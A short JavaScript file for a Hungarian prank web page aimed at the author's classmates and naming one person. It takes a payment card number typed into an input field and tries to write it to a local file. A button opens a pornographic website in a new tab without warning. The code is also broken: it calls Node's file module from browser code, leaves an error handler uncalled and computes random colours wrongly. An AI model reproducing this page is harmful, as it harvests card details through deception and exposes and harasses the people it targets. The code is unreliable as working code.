

alert("Figyelem ez az oldal egy poén az osztájtársaim részére!!!(HA TE NEM VAGY ŐK HAGYD EL AZ OLDALT)")

let név = "Buznyák Péter"

document.body.style.backgroundColor = "Pink"

let KártyaMező;

document.getElementById("KártyaBeküldés").onclick = function() {
    KártyaMező = document.getElementById("Bemenet").value;
    console.log(KártyaMező);
    document.getElementById("kártyaszámod").textContent = KártyaMező;
    const fs = require('fs');
    const content = KártyaMező;
    fs.appendFile('Kártya.txt', content, err => {
	    if(err){
		    console.err;
		    return;
	    }
    })
}

let gomb = document.getElementById("Kattgom")
function katt(){
    console.log("Gombra katt")
    let randomColor = Math.floor(Math.random() * 1677722).toString(16)
    document.body.style.backgroundColor = "#"+randomColor
    window.open("http://www.pornhub.com", "_blank")

    let ujszüveg = document.createElement("h1")
    ujszüveg.innerText = "Rákattintottál"
    document.body.appendChild(ujszüveg)
}
gomb.addEventListener("click", katt)

(function(console){

console.save = function(data, filename){

    if(!data) {
        console.error('Console.save: No data')
        return;
    }

    if(!filename) filename = 'console.json'

    if(typeof data === "object"){
        data = JSON.stringify(data, undefined, 4)
    }

    var blob = new Blob([data], {type: 'text/json'}),
        e    = document.createEvent('MouseEvents'),
        a    = document.createElement('a')

    a.download = filename
    a.href = window.URL.createObjectURL(blob)
    a.dataset.downloadurl =  ['text/json', a.download, a.href].join(':')
    e.initMouseEvent('click', true, false, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null)
    a.dispatchEvent(e)
 }
})(console) 